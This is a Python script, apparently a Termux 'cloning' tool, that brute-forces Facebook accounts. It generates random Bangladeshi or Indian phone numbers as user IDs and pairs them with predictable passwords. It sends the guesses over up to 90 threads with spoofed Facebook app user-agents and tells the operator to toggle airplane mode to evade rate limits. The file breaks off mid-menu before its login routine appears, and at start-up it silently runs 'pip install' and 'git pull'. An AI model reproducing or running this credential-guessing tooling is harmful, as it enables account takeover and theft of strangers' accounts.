#__________________[ IMPORT ]__________________#o
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] LOADING MODULES ')
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
os.system('pip install mechanize > /dev/null')
os.system("git pull")
os.system("pkg install sox -y")
os.system("play op.mp3")
os.system("pkg install espeak")
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#__________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
ATOM="ATOM-"
imt="SETU"
ak="SECURITY-KEY-"
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; SMILE\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#__________________[ LOGO. ..]__________________#
logo =f"""\033[38;5;33m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ
\033[38;5;196m──────────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON X 𝗖𝗛𝗢𝗬𝗢𝗡
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m 109.0.5.0.3
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────"""
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{A}──────────────────────────────────────────────────')
        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
        print(f'\r{A}──────────────────────────────────────────────────')
        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    os.system('espeak -a 300 " WELLCOME,  TO,  MR,  SMILE,  TOOLS"')
    clear()
    print(f'{A}[{G1}1{A}]{A} FILE CLONING')
    print(f'{A}[{G1}2{A}]{A} RANDOM CLONING')
    print(f'{A}[{G1}3{A}]{A} CONTACT TOOL OWNER')
    print(f'{A}[{R}0{A}]{A} EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    os.system('espeak -a 300 " UPDATED,   ALL,   METHOD"')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open ');menu()
    elif select =='0':
        exit(f'{A}[{G1}={A}]{A} EXIT DONE ')
    else:
        print(f'{A}[{G1}={A}]{A} VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    elif select =='0':
        menu()
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Habib(max_workers=90) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________[ INDIA ]__________________#
def _India_():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701');linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751','12345678','123456','1234567','love,ids[:6]']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________[ FILE AUTO ]__________________#
def amul():
 ios_version = random.choice(["5.0.1","8.0.0","4.4.4","5.0.1","10","7.0.0","9","7.1.1","7.1.2","8.1.0","7.0","5.1.1","4.0.4","6.0.1","11","7.0","5.1","4.4.2","6.0","13","2.3.0","9.0.1","5.1","7.0","5.1","8.1","12","5"])
 END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
 ua = random.choice(["[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.24."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/O2 - UK;FBMF/TCL;FBBD/TCL;FBDV/5003D_EEA;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.33."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Astelit-LIFE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.39."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.10."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/cs_CZ;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]"])+END
 return ua
 
def jadu():
    END = '[FBAN/EMA;FBBV/16048044;FBAV/44.0.0.8.52;FBDV/Z987;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})'+END
    return ua
  
def ooo():
    AMSS2 = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
    gtt = random.choice(AMSS2)
    ua1 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.10."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]'
    ua2 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.18."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua3 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.31."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'
    ua4 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.44."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/TELEKOM.RO;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/MAR-LX1A;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2107};FB_FW/1;]'
    ua5 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.8."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]'
    ua6 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.15."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{str(gtt)};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua7 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.40."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]'
    ua8 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.29."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua9 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.14."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_PH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]'
    ua10 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.18."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua11 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.9."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo TB-X505F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.0,width=1280,height=784};FB_FW/1;]'
    ua12 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.22."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12])

def useragent():
    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
    enCRACK1 = ['en_GB','en_US']
    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
    CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat','null','','']
    modelxxx =  ['Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3']
    gtt =random.choice(modelxxx)
    android_version=str(random.randrange(6,13))
    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
    
    fbbv = str(random.randint(111111111,999999999))
    
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua    
    
def useragent_control():
    one = str(random.randint(101,303))
    two = str(random.randint(101,303))
    U_V1 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097196;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V2 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454129;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/airtel;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V3 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_GB;FBCR/Reliance;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1033;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V4 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20748104;FBDM/{{density=1.5,width=540,height=960}};FBLC/en_US;FBCR/XL Axiata;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A33w;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V5 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454026;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D801;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V6 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097172;FBDM/{{density=1.5,width=540,height=960}};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V7 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748054;FBDM/{{density=2.0,width=720,height=1280}};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    U_V8 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748051;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_ES;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G6-L11;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
    U_V9 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
    U_V10 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20453986;FBDM/{{density=1.5,width=480,height=854}};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y511-U251;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
    A_VALL = random.choice([U_V1, U_V2, U_V3, U_V4, U_V5, U_V6, U_V7, U_V8, U_V9, U_V10])
    return A_VALL   
#__________________[ FILE ]__________________#    
def _file_():
    global methods
    clear()
    print(f'{A}[{R}1{A}]{Y} METHOD {A}[{G5}M1{A}]{G1} ')
    print(f'{A}[{R}2{A}]{Y} METHOD {A}[{G5}M2{A}]{G1} ')
    print(f'{A}[{R}3{A}]{Y} METHOD {A}[{G5}M3{A}]{G1} ')
    print(f'{A}[{R}4{A}]{Y} METHOD {A}[{G5}M4{A}]{G1} ')
    print(f'{A}[{R}5{A}]{Y} METHOD {A}[{G5}M5{A}]{G1} ')
    print(f'{A}[{R}6{A}]{Y} METHOD {A}[{G5}M6{A}]{G1} ')
    linex()
    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
    if option =='1':
